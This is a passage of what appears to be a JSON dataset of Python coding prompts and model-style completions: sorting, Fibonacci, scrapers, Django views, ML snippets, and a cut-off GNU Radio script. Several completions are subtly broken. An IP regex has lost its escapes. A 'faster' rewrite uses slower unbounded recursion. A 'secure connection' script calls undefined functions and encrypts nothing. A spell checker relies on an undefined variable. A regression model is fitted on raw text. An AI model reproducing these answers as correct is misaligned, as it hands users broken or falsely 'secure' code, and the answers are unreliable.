Code arr = [3, 8, 4, 3, 2, 8] print(removeDuplicates(arr))"},{"prompt":"Design a class in Python to represent a circle. < noinput >","completion":"class Circle: \\"\\"\\"Class to represent a circle.\\"\\"\\" def __init__(self, radius): \\"\\"\\"Initialize the circle.\\"\\"\\" self.radius = radius def get_area(self): \\"\\"\\"Calculate and return the area of the circle.\\"\\"\\" return 3.14 * self.radius * self.radius"},{"prompt":"Create a program in Python which can calculate the median of an array of integers. [3, 5, 7, 4, 8, 1, 9]","completion":"def median(arr): arr.sort() if len(arr) % 2 != 0: return arr[len(arr)//2] else: return (arr[len(arr)//2 - 1] + arr[len(arr)//2]) / 2 arr = [3, 5, 7, 4, 8, 1, 9] med = median(arr) print('Median of the given array is:', med)"},{"prompt":"Update the given Python program to shuffle an array of numbers. [1, 2, 3, 4, 5, 6]","completion":"import random def shuffleArray(arr): random.shuffle(arr) return arr array = [1, 2, 3, 4, 5, 6] shuffledArray = shuffleArray(array) print(shuffledArray)"},{"prompt":"Create a python program to summarize a given text using natural language processing.","completion":"import nltk from nltk.tokenize import sent_tokenize, word_tokenize from nltk.corpus import stopwords from collections import defaultdict from string import punctuation from heapq import nlargest import numpy as np # Function to summarize the given text def summarize(text, n): # Tokenize the sentences in the text sents = sent_tokenize(text) # Tokenize the words in the text words = word_tokenize(text.lower()) # Generate a list of stop words stop_words = set(stopwords.words('english') + list(punctuation)) # Create a word frequency dictionary word_freq = defaultdict(int) for word in words: if word not in stop_words: word_freq[word] += 1 max_freq = max(word_freq.values()) # Normalize the frequencies for word in word_freq.keys(): word_freq[word] *= 1.0/max_freq # Compute sentence scores sent_scores = defaultdict(int) for i, sent in enumerate(sents): for word in word_tokenize(sent.lower()): if word in word_freq.keys(): sent_scores[i] += word_freq[word] # Identify the n highest scoring sentences summary_sents = nlargest(n, sent_scores, key=sent_scores.get) summary = [sents[j] for j in sorted(summary_sents)] return ' '.join(summary)"},{"prompt":"Build a web scraper in Python that scrapes the content from a web page. Not applicable","completion":"import requests from bs4 import BeautifulSoup URL = 'https://example.com/page' r = requests.get(URL) soup = BeautifulSoup(r.content, 'html5lib') # Get all the links on the page links = soup.find_all('a') # Get the text from all the links link_text = [link.text for link in links] # Get the URLs for all the links link_urls = [link.get('href') for link in links]"},{"prompt":"Create a python function to check if a given string contains a specific substring. The function should loop through the string and find the substring, and return a boolean value indicating if the substring was found or not. myString = Hello World! substring = World","completion":"def checkIfStringContainsSubstring(myString, substring): for i in range(len(myString) - len(substring) + 1): if myString[i:i+len(substring)] == substring: return True return False"},{"prompt":"Write a Python function to multiply two given numbers.","completion":"def multiply(num1, num2): return num1 * num2"},{"prompt":"Create a Python program to parse a list of strings and print the words with odd length. ['abc', 'hello', 'world']","completion":"list = ['abc', 'hello', 'world'] for word in list: if (len(word) % 2 != 0): print(word)"},{"prompt":"Generate a function for multiplying two matrices in Python. matrix1 = [ [1, 2], [3, 4] ] matrix2 = [ [5, 6], [7, 8] ]","completion":"def multiply_matrices(matrix1, matrix2): # Calculates the number of rows and columns of the matrices rows_A = len(matrix1) cols_A = len(matrix1[0]) rows_B = len(matrix2) cols_B = len(matrix2[0]) # Check if the matrices have valid dimensions if cols_A != rows_B: print(\\"Error! The matrices have invalid dimensions\\") # Initialize a new matrix as result result = [[0 for row in range(cols_B)] for col in range(rows_A)] # Iterate over the rows of the first matrix for i in range(rows_A): # Iterate over the columns of the second matrix for j in range(cols_B): # Iterate over the columns of the first matrix for k in range(cols_A): result[i][j] += matrix1[i][k] * matrix2[k][j] return result # Input matrices matrix1 = [ [1, 2], [3, 4] ] matrix2 = [ [5, 6], [7, 8] ] # Call the function and print the result result = multiply_matrices(matrix1, matrix2) print(result) // [[19, 22], [43, 50]]"},{"prompt":"Convert the following code from C++ to Python. int main() { int val1 = 25; int val2 = 6; int sum = val1 + val2; cout << sum; return 0; }","completion":"def main(): val1 = 25 val2 = 6 sum = val1 + val2 print(sum) return 0"},{"prompt":"Program a function in Python that takes an array and shuffles its elements.","completion":"import random def shuffleArray(array): for i in range(len(array)): randomIdx = random.randint(0,len(array)-1) temp = array[i] array[i] = array[randomIdx] array[randomIdx] = temp return array"},{"prompt":"Build a natural language processor that can translate English to French.","completion":"# Python import googletrans from googletrans import Translator translator = Translator() text = 'Hello, World!' result = translator.translate(text, dest='fr') print(result.text)"},{"prompt":"Create a Python program with a class \`\`\`Book\`\`\` that has \`\`\`title\`\`\` and \`\`\`author\`\`\` properties. Not applicable","completion":"class Book: def __init__(self, title, author): self.title = title self.author = author def __str__(self): return f'{self.title} by {self.author}'"},{"prompt":"Generate a correct python code to sort a given array of numbers.","completion":"def bubble_sort(arr): for i in range(len(arr)-1): for j in range(len(arr)-1-i): if arr[j] > arr[j+1]: arr[j],arr[j+1] = arr[j+1],arr[j] return arr"},{"prompt":"Create a Python function to calculate the particle diameter of a given radius. radius = 0.75","completion":"def particle_diameter(radius): return 2 * radius diameter = particle_diameter(0.75) print(diameter) # Output: 1.5"},{"prompt":"Write Python code to determine whether or not a given string contains a valid IP address.","completion":"import re def is_ip_valid(ip): pattern = r\\"^d{1,3}.d{1,3}.d{1,3}.d{1,3}\\" if re.match(pattern, ip): return True else: return False print(is_ip_valid(\\"192.168.0.1\\"))"},{"prompt":"Create a REST API with Python and Django that allows users to list items, create a new item, and delete an existing item. Not applicable","completion":"# models.py from django.db import models class Item(models.Model): name = models.CharField(max_length=255) # views.py from django.http import JsonResponse from .models import Item def list_items(request): items = Item.objects.all() items_list = [item.name for item in items] return JsonResponse(items_list, safe=False) def create_item(request): item = Item(name=request.POST['name']) item.save() return JsonResponse({'message': 'Item created'}) def delete_item(request): item = Item.objects.get(name=request.POST['name']) item.delete() return JsonResponse({'message': 'Item deleted'}) # urls.py from django.urls import path from .views import list_items, create_item, delete_item urlpatterns = [ path('items/', list_items, name='items-list'), path('items/create', create_item, name='items-create'), path('items/delete', delete_item, name='items-delete'), ]"},{"prompt":"Create a Python program to display the Fibonacci sequence up to n.","completion":"# This Python 3 code prints the Fibonacci sequence up to n def Fibonacci(n): f0, f1 = 0, 1 for i in range(0, n): print(f0,end=\\" \\"); next = f0 + f1; f0 = f1; f1 = next; # Driver Program print(\\"Fibonacci sequence up to n: \\") Fibonacci(10)"},{"prompt":"Write a Python program to automatically format and validate user input. Not applicable","completion":"import re def validate_input(input): # validate pattern: pattern = r\\"^[a-zA-Z]*\\" # compile regex regex = re.compile(pattern) # check if input matches pattern if(regex.match(input)): # format the input input = input.lower().capitalize() # return formatted input return input else: # return error return \\"Error: Invalid input\\""},{"prompt":"Create a program to detect plagiarism using Python.","completion":"import difflib def detect_plagiarism(text1, text2): sequenceMatcher = difflib.SequenceMatcher(None, text1, text2) matchPercentage = sequenceMatcher.ratio() * 100 return matchPercentage detect_plagiarism(\\"This is a sample text\\", \\"This is a sample text.\\")"},{"prompt":"Create a random number generator in Python.","completion":"import random def random_num_generator(): return random.randint(0, 9) # Print a number print(random_num_generator())"},{"prompt":"Given a set of input and output vectors, write a Python function to train a perceptron to classify the vectors. The function should take two parameters: the input training data X and the corresponding output labels y. X = [[0, 0], [0, 1], [1, 0], [1, 1]] y = ['0', '1', '1', '0']","completion":"import numpy as np def train_perceptron(X, y): # initialize weights and bias values weights = np.zeros(len(X[0])) bias = 0 # define learning rate lr = 0.01 # number of epochs epochs = 100 # train the weights and bias for _ in range(epochs): for i in range(len(X)): z = np.dot(X[i], weights) + bias prediction = 1 if z >= 0 else 0 weights = weights + lr * (y[i] - prediction) * X[i] bias = bias + lr * (y[i] - prediction) return weights, bias"},{"prompt":"Create a webhook in Python for a Slack bot. This webhook should provide an endpoint to post messages to Slack. Not applicable","completion":"from flask import Flask, request, Response import json import requests app = Flask(__name__) # replace THIS_IS_YOUR_SLACK_WEBHOOK_URL with the URL of Slack Webhook SLACK_WEBHOOK_URL = 'THIS_IS_YOUR_SLACK_WEBHOOK_URL' # create a route for the webhook @app.route('/slack', methods=['POST']) def post_to_slack(): # get the payload from the request data = request.get_json() # process the payload # post the message to the Slack webhook payload = { 'text': data['message'] } response = requests.post(SLACK_WEBHOOK_URL, data=json.dumps(payload)) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Write a piece of code in Python to reverse a given string. abcdef","completion":"string = 'abcdef' print(string[::-1])"},{"prompt":"Write a Python program that takes an input list of integers and finds out the sum of all the odd elements in the list. List: [2, 3, 4, 5, 6]","completion":"def sum_odd_elements(int_list): '''This function takes a list of integers and returns the sum of all the odd elements.''' total = 0 for num in int_list: if num % 2 != 0: total += num return total int_list = [2, 3, 4, 5, 6] sum = sum_odd_elements(int_list) print(sum) # 8"},{"prompt":"Write a Python function that takes in a list of strings and returns a new list with all duplicates removed. [apple,apple,banana,orange,pear,banana]","completion":"def remove_duplicates(lst): new_list = [] for x in lst: if x not in new_list: new_list.append(x) return new_list print(remove_duplicates([\\"apple\\",\\"apple\\",\\"banana\\",\\"orange\\",\\"pear\\",\\"banana\\"]))"},{"prompt":"Design a software that reverse orders of string words. Python programming is fu","completion":"def reverse_string_words(string): words = string.split(\\" \\") words.reverse() return ' '.join(words) string = \\"Python programming is fun\\" print(reverse_string_words(string))"},{"prompt":"Create a Python program that takes a varchar input and encodes it using the Base 64 algorithm. Hello World!","completion":"import base64 string = \\"Hello World!\\" data_bytes = string.encode('ascii') encoded_string = base64.b64encode(data_bytes) print(encoded_string)"},{"prompt":"Write a Python script to predict the sentiment of a given sentence using the TextBlob library. Life is full of surprises.","completion":"import textblob sentence = \\"Life is full of surprises.\\" sentiment = textblob.TextBlob(sentence).sentiment.polarity if sentiment == 0: # neutral sentiment print(\\"Neutral Sentiment\\") elif sentiment > 0: # positive sentiment print(\\"Positive Sentiment\\") else: # negative sentiment print(\\"Negative Sentiment\\")"},{"prompt":"Generate a Python program to determine if a given binary tree is balanced","completion":"class Node: def __init__(self, val): self.val = val self.left = None self.right = None def is_balanced(node): if node is None: return True left_height = get_height(node.left) right_height = get_height(node.right) return (abs(left_height - right_height) <= 1 and is_balanced(node.left) == True and is_balanced(node.right) == True ) def get_height(node): if node is None: return 0 return 1 + max(get_height(node.left), get_height(node.right))"},{"prompt":"Design a neural network application in Python to predict the price of real estate. Table Name: Properties Columns: id: int location: varchar size: int price:","completion":"# Imports import numpy as np import pandas as pd from sklearn import preprocessing import tensorflow as tf import keras # Read in the data data = pd.read_csv('data/properties.csv') # Split data into features and labels X = data[['location', 'size']] y = data['price'] # Preprocess the data scaler = preprocessing.StandardScaler() X = scaler.fit_transform(X) # Build the model model = keras.Sequential() # Input Layer model.add(tf.keras.layers.InputLayer(input_shape=(2,))) # Hidden Layers model.add(tf.keras.layers.Dense(128, activation='relu')) model.add(tf.keras.layers.Dense(128, activation='relu')) model.add(tf.keras.layers.Dense(128, activation='relu')) # Output Layer model.add(tf.keras.layers.Dense(1)) # Compile the model model.compile( optimizer='adam', loss='mean_squared_error', metrics=['mae'] ) # Train the model model.fit(X, y, epochs=10, batch_size=256) # Test the model test_data = np.array([[127, 2123]], dtype=float) test_data = scaler.transform(test_data) prediction = model.predict(test_data) print(prediction)"},{"prompt":"Generate a Python program to remove duplicates from a list. [1, 4, 2, 6, 4, 1, 2]","completion":"def remove_duplicates(list1): # Function to remove duplicates from a list # convert the list into a set of unique elements list_unique = set(list1) # convert the set to a list list_unique = list(list_unique) return list_unique # input list list1 = [1, 4, 2, 6, 4, 1, 2] # remove duplicates from the list list1 = remove_duplicates(list1) # print the new list print(list1)"},{"prompt":"Write a Python program to calculate the value of the expression 2x^2 + 5x + 3 for x = 3. Not applicable","completion":"x = 3 result = 2*(x**2) + 5*x + 3 print(result) # Outputs: 34"},{"prompt":"Fix the following python code. def remove_vowel(string): vowels = ('a', 'e', 'o', 'u') for x in vowels: txt = string.replace(x, ) return tx","completion":"def remove_vowel(string): vowels = ('a', 'e', 'o', 'u') for x in vowels: string = string.replace(x, \\"\\") return string"},{"prompt":"Using the comment as a guide, create a python loop that calculates the sum of the numbers in a given list Input List: [1, 2, 3, 4, 5]","completion":"def sum_list(input_list): \\"\\"\\"Calculate the sum of the numbers in a given list\\"\\"\\" total = 0 for num in input_list: total += num return total"},{"prompt":"Generate a Python program to classify the types of letters contained in a string. 'abcdefghijklmnopqrstuvwxyz'","completion":"def classify_letter_types(string): lowercase_letters = [] uppercase_letters = [] for letter in string: if letter.isupper(): uppercase_letters.append(letter) else: lowercase_letters.append(letter) return { 'lowercase_letters': lowercase_letters, 'uppercase_letters': uppercase_letters }"},{"prompt":"Write a Python script to calculate the distance between two points. Point1 = (x1, y1) Point2 = (x2, y2)","completion":"import math def calculate_distance(x1, y1, x2, y2): x_diff = x2 - x1 y_diff = y2 - y1 distance = math.sqrt(x_diff**2 + y_diff**2) return distance result = calculate_distance(x1, y1, x2, y2) print(result)"},{"prompt":"Construct a python program to delete all duplicate elements in a list list_input = [1,2,3,1,2,4]","completion":"def delete_duplicates(list_input): # Initialize a new list to store non-duplicate elements non_duplicate_list = [] # Iterate through the input list for i in list_input: # Check if the element is already in the non-duplicate list if i not in non_duplicate_list: # If not, add the element to the non-duplicate list non_duplicate_list.append(i) # Return the list without any duplicate elements return non_duplicate_list"},{"prompt":"Design an algorithm to search for a given keyword in a collection of documents using Python. Collection of documents Keyword: ‘Python’","completion":"# an algorithm to search for a given keyword in a collection of documents # the algorithm takes two arguments def search(documents, keyword): # create an empty list matches = [] # loop over the documents for document in documents: # loop over the words in the document for word in document.words: # compare the word to the keyword if word == keyword: # add the document to the list matches.append(document) # return the list of matches return matches"},{"prompt":"Generate a script to establish a secure connection between two computers.","completion":"# Use Python import socket # Create socket object s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Bind the socket to an address and port s.bind((‘127.0.0.1’, 8888)) # Listen for incomming connections s.listen() # Perform handshake to establish a secure connection while True: # Accept connection conn, addr = s.accept() with conn: print('Connected by', addr) # Generate handshake messages handshake_msg = generate_handshake_msg() # Send handshake message conn.send(handshake_msg) # Receive message received_msg = conn.recv(1024) # Validate handshake message if validate_handshake_msg(received_msg): # Establish connection print('Secure connection established!') break"},{"prompt":"Write a Python program to search a substring in a string without using builtin functions. string = ‘This is a test string’ substring = ‘test’","completion":"def search_substring(string, substring): \\"\\"\\"Function to search substring within a string\\"\\"\\" matches = [] # Iterate over the search string for i in range(len(string)): temp = \\"\\" # Iterate over the substring for j in range(len(substring)): if substring[j] == string[i + j]: temp += substring[j] else: break if temp == substring: matches.append(i) # Return the list of matches return matches string = 'This is a test string' substring = 'test' result = search_substring(string, substring) # Print the result print(result) # Output # [10]"},{"prompt":"Generate a python program to print all possible paths from top left to bottom right of a mXn matrix both the row and column indices of the matrix should be numbered starting from 0.","completion":"def print_all_paths(m, n): # create a two dimensional array to store the path path = [[0 for i in range(m)] for j in range(n)] print_all_paths_util(m, n, 0, 0, path) # utility function to print all paths def print_all_paths_util(m, n, row, col, path): # if we reach the bottommost row, then append the # current position to the path array if (row == m-1): for i in range(col, n): path[row][i] = 1 print(path) # If we reach the rightmost column, then append the # current position to the path array elif (col == n-1): for i in range(row, m): path[i][col] = 1 print(path) # When neither row or the column indices # have reached the bottom or rightmost else: # mark the current cell 1 path[row][col] = 1 # print all paths by exploring right print_all_paths_util(m, n, row, col + 1, path) # print all paths by exploring down print_all_paths_util(m, n, row + 1, col, path) # mark the current cell 0 path[row][col] = 0"},{"prompt":"Using Python, construct an algorithm that creates a dictionary with the numbers 15 as keys and the square of each number as its value. Not applicable","completion":"numbers_dictionary = {} for i in range(1,6): numbers_dictionary[i] = i*i print(numbers_dictionary)"},{"prompt":"Design a Python program to simulate a simple calculator.","completion":"#Function to add two numbers def add(val1, val2): return val1+val2 #Function to subtract two numbers def subtract(val1, val2): return val1-val2 #Function to multiply two numbers def multiply(val1, val2): return val1*val2 #Function to divide two numbers def divide(val1, val2): return val1/val2 while True: print(\\"Please provide the operator and operands\\") print(\\"1. Add\\") print(\\"2. Subtract\\") print(\\"3. Multiply\\") print(\\"4. Divide\\") print(\\"5. Exit\\") # Take input from the user choice = int(input(\\"Enter your choice of operation: \\")) # Check if choice is one of the four options if choice in (1, 2, 3, 4): num1 = float(input(\\"Enter the first number: \\")) num2 = float(input(\\"Enter the second number: \\")) if choice == 1: print(num1, \\"+\\", num2, \\"=\\", add(num1,num2)) elif choice == 2: print(num1, \\"-\\", num2, \\"=\\", subtract(num1,num2)) elif choice == 3: print(num1, \\"*\\", num2, \\"=\\", multiply(num1,num2)) elif choice == 4: print(num1, \\"/\\", num2, \\"=\\", divide(num1,num2)) elif choice == 5: print(\\"Exiting Program!\\") break else: print(\\"Please enter a valid option!\\")"},{"prompt":"Write a Python program to calculate the area of a triangle given three side lengths.","completion":"def area_of_triangle(a, b, c): # calculate the semi-perimeter s = (a + b + c) / 2 # calculate the area area = (s * (s-a) * (s-b) * (s-c)) ** 0.5 return area"},{"prompt":"Generate a list of integers from 1 to 10 using a for loop in Python.","completion":"nums = [] for i in range(1, 11): nums.append(i) print(nums)"},{"prompt":"Generate a python script to calculate the distance between two points in 3D space","completion":"def distance_three_d(p1,p2): a = (p2[0] - p1[0])**2 b = (p2[1] - p1[1])**2 c = (p2[2] - p1[2])**2 return (a + b + c) **0.5"},{"prompt":"Enumerate several simple programming solutions to compute the factorial of a number in Python.","completion":"\\"\\"\\" Enumerate several simple programming solutions to compute the factorial of a number in Python \\"\\"\\" # Solution 1: Using a loop def factorial_1(n): fact = 1 for i in range(2, n+1): fact *= i return fact # Solution 2: Using recursion def factorial_2(n): if n == 0: return 1 else: return n * factorial_2(n-1) # Solution 3: Using math library import math def factorial_3(n): return math.factorial(n)"},{"prompt":"Create a function in Python that takes a string as parameter and returns 'True' if the string contains at least one number.","completion":"def contains_number(string): return any(char.isdigit() for char in string)"},{"prompt":"Suggest some techniques to optimize the speed of a python program.","completion":"Some techniques to optimize the speed of a Python program include: - Optimal use of libraries - Use of efficient data structures - Using vectorization and/or NumPy arrays - Writing efficient loops - Enabling for in-place operations - Avoiding unnecessary computations - Using efficient algorithms - Avoiding global accesses - Profiling and memory optimization"},{"prompt":"Create a Python program to calculate the dot product of two vectors. [1, 2, 3] and [4, 5, 6]","completion":"def dot_product(v1, v2): total = 0 for (x1, x2) in zip(v1, v2): total += x1*x2 return total"},{"prompt":"Write a Python script to download a website and save it to a local folder. Domain name of the website = example.com","completion":"import requests from bs4 import BeautifulSoup import os import urllib # Set the URL you want to webscrape from url = 'https://example.com/' # Connect to the URL response = requests.get(url) # Parse HTML and save to BeautifulSoup object soup = BeautifulSoup(response.text, 'html.parser') # Create directory for website os.mkdir(url.split('//')[-1]) # Changing working directory to website directory os.chdir(url.split('//')[-1]) # Create HTML file and save content with open('index.html', 'wb') as f: f.write(soup.prettify('utf-8')) # Get all images # images = soup.findAll('img') images = soup.findAll('img', {'src': True}) # Download images: for image in images: filename = image['src'].split('/')[-1] urllib.request.urlretrieve(image['src'], filename)"},{"prompt":"Edit a given Python program in order to make it run faster. # This function calculates the sum of the numbers 0 to n. def my_sum(n): s = 0 for i in range(n+1): s += i return","completion":"# This function calculates the sum of the numbers 0 to n. def my_sum(n): if n <= 1: return n else: return n + my_sum(n-1)"},{"prompt":"Write a Python program to find the sum of natural numbers less than 500 that are multiples of 3 or 5.","completion":"def sum_multiples(max_num): values = [] for i in range(1, max_num): if i % 3 == 0 or i % 5 == 0: values.append(i) return sum(values) result = sum_multiples(500) print(result)"},{"prompt":"Develop a code in Python to print the nth Fibonacci number. 6","completion":"def Fibonacci(n): if n<0: print(\\"Incorrect input\\") # First Fibonacci number is 0 elif n==1: return 0 # Second Fibonacci number is 1 elif n==2: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) print(Fibonacci(6))"},{"prompt":"Suggest a way to get a substring of a given string in Python.","completion":"def substring(string, start, end): '''This function takes a string, start index and end index, and returns the substring between the two given indexes.''' return string[start:end]"},{"prompt":"mplement a spell checker in Python.","completion":"import re import collections def words(text): return re.findall('[a-z]+', text.lower()) def train(features): model = collections.defaultdict(lambda: 1) for f in features: model[f] += 1 return model NWORDS = train(words(open('big.txt').read())) def edits1(word): s = [(word[:i], word[i:]) for i in range(len(word) + 1)] deletes = [a + b[1:] for a, b in s if b] transposes = [a + b[1] + b[0] + b[2:] for a, b in s if len(b)>1] replaces = [a + c + b[1:] for a, b in s for c in alphabet if b] inserts = [a + c + b for a, b in s for c in alphabet] return set(deletes + transposes + replaces + inserts) def known_edits2(word): return set(e2 for e1 in edits1(word) for e2 in edits1(e1) if e2 in NWORDS) def known(words): return set(w for w in words if w in NWORDS) def correct(word): candidates = known([word]) or known(edits1(word)) or known_edits2(word) or [word] return max(candidates, key=NWORDS.get)"},{"prompt":"Given a duration in seconds, write a Python code to convert it into a string showing hours, minutes and seconds. 32400","completion":"def to_time_string(duration): hours, remainder = divmod(duration, 3600) minutes, seconds = divmod(remainder, 60) return \\"%02d:%02d:%02d\\" % (hours, minutes, seconds) print(to_time_string(32400))"},{"prompt":"Create a class in Python to represent a Person with attributes: name, age, height, and weight. Not applicable","completion":"class Person: def __init__(self, name, age, height, weight): self.name = name self.age = age self.height = height self.weight = weight def describe(self): return f'{self.name} is {self.age} years old, {self.height} cm tall and weighs {self.weight} kg.'"},{"prompt":"Can you write a Python script to print the first 20 prime numbers?","completion":"# Program to print the first 20 prime numbers def is_prime(num): # Base case if num == 1: return False elif num == 2: return True elif num % 2 == 0: return False # Iterate from 3 to the sqrt of number i = 3 while(i * i <= num): if num % i == 0: return False i = i + 2 return True # Print the first 20 prime numbers n = 2 count = 0 while count < 20: if is_prime(n): print(n, end=' ', flush=True) count += 1 n += 1"},{"prompt":"Create a Python script that reverses the order of the words in each sentence in a given text. The quick brown fox jumped over the lazy dog.","completion":"def reverse_order(text): # Split the text into sentences sentences = text.split(\\".\\") # Reverse the order of the words in each sentences for index, sentence in enumerate(sentences): words = sentence.split(\\" \\") reversed_words = words[::-1] sentences[index] = \\" \\".join(reversed_words) # Join the sentences in the original order reversed_text = \\". \\".join(sentences) # Return the result return reversed_text reverse_order(\\"The quick brown fox jumped over the lazy dog.\\") # Output: dog. lazy the over jumped fox brown quick The"},{"prompt":"Create a Python script to print the numbers between 500 and 1000 that are divisible by 7","completion":"for i in range(500, 1001): if i%7 == 0: print(i, end=' ')"},{"prompt":"Create a machine learning model in Python that can predict the number of likes a post in a social media platform will get given its text content, shares count, and other additional information. text content: “I am going on a vacation next week! #vacation #excited” shares count: 25 additional information: post published within the last 24 hour","completion":"# Import the relevant libraries import pandas as pd from sklearn.model_selection import train_test_split from sklearn.linear_model import LinearRegression # Load the dataset data = pd.read_csv('posts.csv') # Preprocess the data data['is_recent'] = data['date'] > (pd.datetime.now() - pd.Timedelta(days=1)) # Create the feature matrix and the target vector X = data[['text_content', 'shares_count', 'is_recent']] y = data['likes_count'] # Split the data into training and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) # Train the model model = LinearRegression() model.fit(X_train, y_train) # Make predictions on test set predictions = model.predict(X_test) # Calculate the accuracy accuracy = model.score(X_test, y_test) print('Model accuracy:', accuracy)"},{"prompt":"Write a Python program to find the first nonrepeated character of a given string. string = teststring","completion":"def first_non_repeated_char(string): for ch in string: if string.count(ch) == 1: return ch"},{"prompt":"Use the BeautifulSoup library in Python to parse HTML from a website. Example website: https://www.example.com","completion":"import requests from bs4 import BeautifulSoup #make a GET request response = requests.get('https://www.example.com') #parse HTML soup = BeautifulSoup(response.text, 'html.parser')"},{"prompt":"This code generates a GNU Radio Python Flow Graph for an output window. To use it, import the necessary libraries and create an instance of the Output_window class. Set the desired threshold, sample rate, frequency, and FFT size using the provided methods. Then start the flow graph using the Start() method and wait for it to finish using the Wait() method.","completion":"#!/usr/bin/env python2 # GNU Radio Python Flow Graph # Title: Output Window # Generated: Sat Apr 30 16:45:27 2016 if __name__ == '__main__': import ctypes import sys if sys.platform.startswith('linux'): try: x11 = ctypes.cdll.LoadLibrary('libX11.so') x11.XInitThreads() except: print \\"Warning: failed to XInitThreads()\\" from gnuradio import analog from gnuradio import blocks from gnuradio import eng_notation from gnuradio import fft from gnuradio import gr from gnuradio import wxgui from gnuradio.eng_option import eng_option from gnuradio.fft import window from gnuradio.filter import firdes from gnuradio.wxgui import fftsink2 from gnuradio.wxgui import forms from gnuradio.wxgui import numbersink2 from grc_gnuradio import wxgui as grc_wxgui from optparse import OptionParser import osmosdr import time import wx class Output_window(grc_wxgui.top_block_gui): def __init__(self): grc_wxgui.top_block_gui.__init__(self, title=\\"Output Window\\") _icon_path = \\"/usr/share/icons/hicolor/32x32/apps/gnuradio-grc.png\\" self.SetIcon(wx.Icon(_icon_path, wx.BITMAP_TYPE_ANY)) # Variables self.threshold = threshold = -55 self.samp_rate = samp_rate = 2.048e6 self.freq = freq = 658e6 self.fft_size = fft_size = 1.024e3 # Blocks self.notebook = self.notebook = wx.Notebook(self.GetWin(), style=wx.NB_TOP) self.notebook.AddPage(grc_wxgui.Panel(self.notebook), \\"Spectrum\\") self.notebook.AddPage(grc_wxgui.Panel(self.notebook), \\"Output\\") self.notebook.AddPage(grc_wxgui.Panel(self.notebook), \\"Stream\\") self.Add(self.notebook) _threshold_sizer = wx.BoxSizer(wx.VERTICAL) self._threshold_text_box = forms.text_box( parent=self.notebook.GetPage(1).GetWin(), sizer=_threshold_sizer, value=self.threshold, callback=self.set_threshold, label=\\"Threshold\\", converter=forms.float_converter(), proportion=0, ) self._threshold_slider = forms.slider( parent=self.notebook.GetPage(1).GetWin(), sizer=_threshold_sizer, value=self.threshold, callback=self.set_threshold, minimum=-100, maximum=0, num_steps=100, style=wx.SL_HORIZONTAL, cast=float, proportion=1, ) self.notebook.GetPage(1).Add(_threshold_sizer) _freq_sizer = wx.BoxSizer(wx.VERTICAL) self._freq_text_box = forms.text_box( parent=self.notebook.GetPage(0).GetWin(), sizer=_freq_sizer, value=self.freq, callback=self.set_freq, label=\\"freq\\", converter=forms.float_converter(), proportion=0, ) self._freq_slider = forms.slider( parent=self.notebook.GetPage(0).GetWin(), sizer=_freq_sizer, value=self.freq, callback=self.set_freq, minimum=10e6, maximum=10e9, num_steps=100, style=wx.SL_HORIZONTAL, cast=float, proportion=1, ) self.notebook.GetPage(0).Add(_freq_sizer) self.wxgui_numbersink2_1 = numbersink2.number_sink_f( self.notebook.GetPage(1).GetWin(), unit=\\"signal present\\", minval=0, maxval=1, factor=1, decimal_places=0, ref_level=0, sample_rate=samp_rate, number_rate=15, average=False, avg_alpha=None, label=\\"Signal Detection\\", peak_hold=False, show_gauge=True, ) self.notebook.GetPage(1).Add(self.wxgui_numbersink2_1.win) self.wxgui_numbersink2_0 = numbersink2.number_sink_f( self.notebook.GetPage(1).GetWin(), unit=\\"dB\\", minval=-120, maxval=0, factor=1.0, decimal_places=10, ref_level=0, sample_rate=samp_rate, number_rate=15, average=False, avg_alpha=30e-3, label=\\"level\\", peak_hold=False, show_gauge=False, ) self.notebook.GetPage(1).Add(self.wxgui_numbersink2_0.win) self.wxgui_fftsink2_0 = fftsink2.fft_sink_c( self.notebook.GetPage(0).GetWin(), baseband_freq=freq, y_per_div=5, y_divs=10, ref_level=0, ref_scale=2.0, sample_rate=samp_rate, fft_size=1024, fft_rate=15, average=True, avg_alpha=30e-3, title=\\"Spectrum\\", peak_hold=False, win=window.rectangular, ) self.notebook.GetPage(0).Add(self.wxgui_fftsink2_0.win) self.rtlsdr_source_0 = osmosdr.source( args=\\"numchan=\\" + str(1) + \\" \\" + \\"\\" ) self.rtlsdr_source_0.set_sample_rate(samp_rate) self.rtlsdr_source_0.set_center_freq(freq, 0) self.rtlsdr_source_0.set_freq_corr(0, 0) self.rtlsdr_source_0.set_dc_offset_mode(0, 0) self.rtlsdr_source_0.set_iq_balance_mode(0, 0) self.rtlsdr_source_0.set_gain_mode(False, 0) self.rtlsdr_source_0.set_gain(20, 0) self.rtlsdr_source_0.set_if_gain(10, 0) self.rtlsdr_source_0.set_bb_gain(5, 0) self.rtlsdr_source_0.set_antenna(\\"\\", 0) self.rtlsdr_source_0.set_bandwidth(0, 0) self.fft_1 = fft.fft_vcc(1024, True, (window.rectangular(1024)), True, 1) self.blocks_vector_to_stream_0 = blocks.vector_to_stream(gr.sizeof_float*1, 1024) self.blocks_threshold_ff_0 = blocks.threshold_ff(-100, threshold, 0) self.blocks_stream_to_vector_0 = blocks.stream_to_vector(gr.sizeof_gr_complex*1, 1024) self.blocks_nlog10_ff_0 = blocks.nlog10_ff(10, 1, 0) self.blocks_file_sink_0 = blocks.file_sink(gr.sizeof_float*1, \\"/media/shashwat/DATA/Q3/Wireless Networking/gnu codes/Outputs/db_498\\", False) self.blocks_file_sink_0.set_unbuffered(False) self.blocks_divide_xx_0 = blocks.divide_ff(1) self.blocks_complex_to_mag_squared_0 = blocks.complex_to_mag_squared(1024) self.analog_const_source_x_0 = analog.sig_source_f(0, analog.GR_CONST_WAVE, 0, 0, 1.04858e6) # Connections self.connect((self.analog_const_source_x_0, 0), (self.blocks_divide_xx_0, 1)) self.connect((self.blocks_complex_to_mag_squared_0, 0), (self.blocks_vector_to_stream_0, 0)) self.connect((self.blocks_divide_xx_0, 0), (self.blocks_nlog10_ff_0, 0)) self.connect((self.blocks_nlog10_ff_0, 0), (self.blocks_file_sink_0, 0)) self.connect((self.blocks_nlog10_ff_0, 0), (self.blocks_threshold_ff_0, 0)) self.connect((self.blocks_nlog10_ff_0, 0), (self.wxgui_numbersink2_0, 0)) self.connect((self.blocks_stream_to_vector_0, 0), (self.fft_1, 0)) self.connect((self.blocks_threshold_ff_0, 0), (self.wxgui_numbersink2_1, 0)) self.connect((self.blocks_vector_to_stream_0, 0), (self.blocks_divide_xx_0, 0)) self.connect((self.fft_1, 0), 